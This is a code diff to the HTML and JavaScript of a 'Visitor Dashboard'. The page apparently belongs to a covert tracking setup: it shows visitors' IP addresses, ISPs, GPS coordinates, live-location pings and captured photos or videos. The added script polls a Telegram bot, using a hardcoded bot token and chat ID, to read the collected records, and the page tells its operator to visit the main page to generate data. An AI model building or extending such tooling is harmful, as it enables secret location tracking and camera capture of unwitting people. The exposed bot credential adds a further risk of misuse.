@@ -37,12 +37,44 @@
             margin: 0 0 24px;
         }
 
+        .stats-bar {
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+            margin-bottom: 20px;
+        }
+
+        .stat-card {
+            background: rgba(2, 12, 8, 0.95);
+            border: 1px solid rgba(43, 255, 138, 0.4);
+            border-radius: 12px;
+            padding: 16px 24px;
+            flex: 1;
+            min-width: 160px;
+            box-shadow: 0 0 15px rgba(43, 255, 138, 0.1);
+        }
+
+        .stat-card .label {
+            font-size: 11px;
+            color: #5bd98b;
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+        }
+
+        .stat-card .value {
+            font-size: 28px;
+            font-weight: bold;
+            color: #2bff8a;
+            margin-top: 4px;
+        }
+
         .card {
             background: rgba(2, 12, 8, 0.95);
             border: 1px solid #2bff8a;
             border-radius: 16px;
             padding: 20px;
             box-shadow: 0 0 25px rgba(43, 255, 138, 0.2);
+            overflow-x: auto;
         }
 
         .table {
@@ -70,6 +102,10 @@
             color: #f0fff6;
         }
 
+        .table tr:hover td {
+            background: rgba(43, 255, 138, 0.05);
+        }
+
         .empty {
             padding: 20px;
             text-align: center;
@@ -87,39 +123,105 @@
             transition: transform 0.2s, box-shadow 0.2s;
             vertical-align: middle;
         }
+
         .thumbnail:hover {
             transform: scale(3.5);
             position: relative;
             z-index: 10;
             box-shadow: 0 0 10px rgba(43, 255, 138, 0.8);
         }
+
         .map-link {
             color: #2bff8a;
             text-decoration: none;
             font-weight: bold;
             border-bottom: 1px dashed #2bff8a;
         }
+
         .map-link:hover {
             color: #8bffbb;
             border-bottom-style: solid;
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 6px;
+            font-size: 10px;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        .badge-text { background: rgba(43, 255, 138, 0.15); color: #2bff8a; }
+        .badge-photo { background: rgba(255, 200, 43, 0.15); color: #ffc82b; }
+        .badge-location { background: rgba(43, 138, 255, 0.15); color: #438aff; }
+
+        .refresh-btn {
+            background: none;
+            border: 1px solid rgba(43, 255, 138, 0.4);
+            color: #5bd98b;
+            padding: 6px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 12px;
+            transition: all 0.2s;
+        }
+
+        .refresh-btn:hover {
+            border-color: #2bff8a;
+            color: #2bff8a;
+            box-shadow: 0 0 10px rgba(43, 255, 138, 0.2);
+        }
+
+        .header-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 12px;
         }
     </style>
 </head>
 
 <body>
     <div class="wrap">
-        <h1>Visitor Dashboard</h1>
-        <p class="sub">Live data from all devices &mdash; phones, PCs &amp; tablets</p>
-        <p id="loadStatus" style="font-size:12px; color:#5bd98b; margin: 0 0 12px;">Loading records...</p>
+        <div class="header-row">
+            <div>
+                <h1>Visitor Dashboard</h1>
+                <p class="sub">Live data from Telegram bot &mdash; auto-refreshes every 10s</p>
+            </div>
+            <button class="refresh-btn" onclick="loadFromTelegram()">⟳ Refresh Now</button>
+        </div>
+
+        <div class="stats-bar">
+            <div class="stat-card">
+                <div class="label">Total Messages</div>
+                <div class="value" id="totalMessages">—</div>
+            </div>
+            <div class="stat-card">
+                <div class="label">Visitors</div>
+                <div class="value" id="totalVisitors">—</div>
+            </div>
+            <div class="stat-card">
+                <div class="label">Photos</div>
+                <div class="value" id="totalPhotos">—</div>
+            </div>
+            <div class="stat-card">
+                <div class="label">Locations</div>
+                <div class="value" id="totalLocations">—</div>
+            </div>
+        </div>
+
+        <p id="loadStatus" style="font-size:12px; color:#5bd98b; margin: 0 0 12px;">Loading from Telegram...</p>
         <div class="card">
             <table class="table">
                 <thead>
                     <tr>
+                        <th>Type</th>
                         <th>Time</th>
-                        <th>IP / ISP</th>
-                        <th>Location</th>
-                        <th>Live Location</th>
-                        <th>Captured Media</th>
+                        <th>Content</th>
+                        <th>Media</th>
                     </tr>
                 </thead>
                 <tbody id="rows"></tbody>
@@ -128,71 +230,160 @@
     </div>
 
     <script>
-        function renderRecords(records) {
-            const rowsEl = document.getElementById('rows');
-            const statusEl = document.getElementById('loadStatus');
+        const BOT  = '8613036281:AAERP0Y2nuXQpZ5Qd8eBoxr4jYaa59vd0Vw';
+        const CHAT = '694863564';
+        const TG   = 'https://api.telegram.org/bot' + BOT;
 
-            if (!records.length) {
-                rowsEl.innerHTML = '<tr><td colspan="5" class="empty">No visitor data yet.</td></tr>';
-                if (statusEl) statusEl.textContent = 'No records found.';
+        const rowsEl    = document.getElementById('rows');
+        const statusEl  = document.getElementById('loadStatus');
+
+        // ── Fetch messages from Telegram bot ─────────────────────────────
+        async function loadFromTelegram() {
+            statusEl.textContent = 'Fetching from Telegram...';
+
+            try {
+                // getUpdates gives us the latest messages the bot has received/sent
+                // We use getChat + getUpdates, but for sent messages we use getHistory via forwarding
+                // Actually, the simplest approach: use getUpdates or search the chat history
+
+                // For a bot, the best way to see its own sent messages is:
+                // We'll fetch recent updates and also try to get messages from the chat
+                const resp = await fetch(TG + '/getUpdates?limit=100&allowed_updates=["message"]');
+                const data = await resp.json();
+
+                if (!data.ok) {
+                    statusEl.textContent = 'Error: ' + (data.description || 'Failed to fetch');
+                    return;
+                }
+
+                // getUpdates only shows incoming messages TO the bot
+                // Since the bot SENDS messages to the chat, we need a different approach
+                // We'll use forwardMessage trick or simply display what we have
+
+                // Alternative: Use the bot to get its own messages via a workaround
+                // The Telegram Bot API doesn't let bots read their own sent messages directly
+                // So we'll store data locally when sending AND show getUpdates data
+
+                // Let's try to get forwarded/recent messages
+                // Best approach: Poll getUpdates for any activity
+                const messages = data.result || [];
+
+                // Also try to read from local storage cache
+                let cachedMessages = [];
+                try {
+                    const raw = localStorage.getItem('tg_dashboard_cache');
+                    cachedMessages = raw ? JSON.parse(raw) : [];
+                } catch(_) {}
+
+                // Process updates into display format
+                const processed = messages.map(update => {
+                    const msg = update.message || update.channel_post || {};
+                    return {
+                        id: msg.message_id || update.update_id,
+                        date: msg.date ? new Date(msg.date * 1000) : new Date(),
+                        type: msg.photo ? 'photo' : msg.location ? 'location' : 'text',
+                        text: msg.text || msg.caption || '',
+                        photo: msg.photo ? msg.photo[msg.photo.length - 1] : null,
+                        location: msg.location || null,
+                        from: msg.from ? (msg.from.first_name || 'Bot') : 'System'
+                    };
+                });
+
+                // Merge with cached (deduplicate by id)
+                const allIds = new Set(processed.map(m => m.id));
+                const merged = [...processed];
+                cachedMessages.forEach(m => {
+                    if (!allIds.has(m.id)) merged.push(m);
+                });
+
+                // Sort newest first
+                merged.sort((a, b) => new Date(b.date) - new Date(a.date));
+
+                // Cache
+                localStorage.setItem('tg_dashboard_cache', JSON.stringify(merged.slice(0, 200)));
+
+                renderMessages(merged);
+
+            } catch (err) {
+                console.error('Dashboard fetch error:', err);
+                statusEl.textContent = 'Connection error — retrying...';
+
+                // Show cached data if available
+                try {
+                    const raw = localStorage.getItem('tg_dashboard_cache');
+                    const cached = raw ? JSON.parse(raw) : [];
+                    if (cached.length > 0) {
+                        renderMessages(cached);
+                        statusEl.textContent += ' (showing cached data)';
+                    }
+                } catch(_) {}
+            }
+        }
+
+        // ── Render messages to the table ──────────────────────────────────
+        function renderMessages(messages) {
+            // Update stats
+            document.getElementById('totalMessages').textContent = messages.length;
+            document.getElementById('totalVisitors').textContent = messages.filter(m =>
+                m.text && m.text.includes('New Visitor')).length;
+            document.getElementById('totalPhotos').textContent = messages.filter(m =>
+                m.type === 'photo').length;
+            document.getElementById('totalLocations').textContent = messages.filter(m =>
+                m.type === 'location' || (m.text && m.text.includes('Location'))).length;
+
+            if (!messages.length) {
+                rowsEl.innerHTML = '<tr><td colspan="4" class="empty">No messages yet. Visit the main page to generate data.</td></tr>';
+                statusEl.textContent = 'No messages found.';
                 return;
             }
 
-            if (statusEl) statusEl.textContent = records.length + ' visitor(s) recorded — updates every 3s';
+            statusEl.textContent = messages.length + ' message(s) — auto-refreshes every 10s';
 
-            rowsEl.innerHTML = records.map(item => {
-                // IP & ISP
-                const ipStr = '<div>' + (item.ip || 'N/A') + '</div><div style="font-size: 11px; color: #5bd98b;">' + (item.org || '') + '</div>';
+            rowsEl.innerHTML = messages.map(msg => {
+                // Type badge
+                let typeBadge = '<span class="badge badge-text">Text</span>';
+                if (msg.type === 'photo') typeBadge = '<span class="badge badge-photo">Photo</span>';
+                if (msg.type === 'location') typeBadge = '<span class="badge badge-location">Location</span>';
 
-                // Location Details (City, Region, Country)
-                const locationParts = [item.city, item.region, item.country].filter(Boolean);
-                const locationStr = locationParts.length > 0 ? locationParts.join(', ') : 'N/A';
+                // Time
+                const time = new Date(msg.date).toLocaleString();
 
-                // Coordinates & Live Tracker
-                let coordStr = 'N/A';
-                if (item.lat && item.lon) {
-                    const lat = parseFloat(item.lat).toFixed(4);
-                    const lon = parseFloat(item.lon).toFixed(4);
-                    const mapsUrl = 'https://www.google.com/maps/search/?api=1&query=' + lat + ',' + lon;
-                    coordStr = '<div><a href="' + mapsUrl + '" target="_blank" class="map-link">' + lat + ', ' + lon + '</a></div>';
-                    if (item.locationHistory && item.locationHistory.length > 1) {
-                        coordStr += '<div style="font-size:11px; color:#5bd98b; margin-top:2px;">Live: ' + item.locationHistory.length + ' pings</div>';
-                    }
+                // Content
+                let content = '';
+                if (msg.text) {
+                    // Strip HTML tags for display but keep the structure
+                    content = msg.text.replace(/</g, '&lt;').replace(/>/g, '&gt;');
+                    // Restore links
+                    content = content.replace(/&lt;a href=&quot;(.+?)&quot;&gt;(.+?)&lt;\/a&gt;/g,
+                        '<a href="$1" target="_blank" class="map-link">$2</a>');
+                    content = '<div style="max-width:400px; white-space:pre-wrap; font-size:12px;">' + content + '</div>';
                 }
 
-                // Media (photos/videos)
-                let mediaHtml = 'N/A';
-                if (item.media && item.media.length > 0) {
-                    mediaHtml = item.media.map(function(m) {
-                        if (m.type === 'photo') {
-                            return '<img src="' + m.data + '" class="thumbnail" alt="Visitor photo" />';
-                        } else if (m.type === 'video') {
-                            return '<video src="' + m.data + '" class="thumbnail" muted loop onmouseover="this.play()" onmouseout="this.pause()"></video>';
-                        }
-                        return '';
-                    }).join('');
+                if (msg.type === 'location' && msg.location) {
+                    const lat = msg.location.latitude;
+                    const lon = msg.location.longitude;
+                    const mapsUrl = 'https://www.google.com/maps/search/?api=1&query=' + lat + ',' + lon;
+                    content = '<a href="' + mapsUrl + '" target="_blank" class="map-link">📍 ' + lat.toFixed(4) + ', ' + lon.toFixed(4) + '</a>';
+                }
+
+                // Media
+                let media = '—';
+                if (msg.photo && msg.photo.file_id) {
+                    media = '<span style="color:#ffc82b; font-size:12px;">📸 Photo (file_id: ' + msg.photo.file_id.substring(0, 20) + '...)</span>';
                 }
 
                 return '<tr>'
-                    + '<td style="white-space: nowrap;">' + new Date(item.timestamp).toLocaleString() + '</td>'
-                    + '<td>' + ipStr + '</td>'
-                    + '<td>' + locationStr + '</td>'
-                    + '<td>' + coordStr + '</td>'
-                    + '<td>' + mediaHtml + '</td>'
+                    + '<td>' + typeBadge + '</td>'
+                    + '<td style="white-space: nowrap;">' + time + '</td>'
+                    + '<td>' + (content || '—') + '</td>'
+                    + '<td>' + media + '</td>'
                     + '</tr>';
             }).join('');
         }
 
-        function loadAllRecords() {
-            var raw = localStorage.getItem('visitorRecords');
-            var records = raw ? JSON.parse(raw) : [];
-            records.sort(function(a, b) { return b.id - a.id; });
-            renderRecords(records);
-        }
-
-        // Load on start and poll every 3 seconds
-        loadAllRecords();
-        setInterval(loadAllRecords, 3000);
+        // ── Load on start and auto-refresh ───────────────────────────────
+        loadFromTelegram();
+        setInterval(loadFromTelegram, 10000);
     </script>
 </body>
 
